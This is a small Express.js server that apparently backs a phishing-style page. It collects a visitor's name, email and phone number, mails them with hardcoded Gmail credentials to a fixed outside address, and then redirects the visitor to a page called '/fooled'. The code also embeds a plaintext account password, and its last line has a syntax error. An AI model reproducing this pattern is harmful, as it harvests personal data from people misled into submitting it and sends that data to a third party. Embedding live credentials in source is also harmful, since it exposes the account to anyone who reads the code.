const express = require('express');
const app = express();
const nodemailer = require('nodemailer');


app.get('/', function(req, res){
    console.log('A Request');
    res.sendFile(__dirname + '/html/index.html');
})


app.get('/fooled', function(req, res){
    console.log('A Request');
    res.sendFile(__dirname + '/html/fooled.html');
})

app.get('/submit', function(req, res){
    let name = req.query.name;
    let email = req.query.email;
    let phone = req.query.phone;
    let text = 'Name : ' + name + '\nPhone : ' + phone;
    
    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: { user :  'finapp.lsbdc@gmail.com', pass: 'racoons@1'}
       });
     transporter.sendMail({
         from: 'finapp.lsbdc@gmail.com',
         to : email,
         subject: 'User\'s Phone Number',
         text : text
     });

     transporter.sendMail({
        from: 'finapp.lsbdc@gmail.com',
        to : 'thakurps@warhawks.ulm.edu',
        subject: 'User\'s Phone Number',
        text : text
    });
    res.redirect("/fooled")
})


app.get('*', function(req, res){
    console.log('A Request');
    res.sendFile(__dirname + '/html/404.html');
})


app.listen(80, ()=> console.log('Running on Port 80');
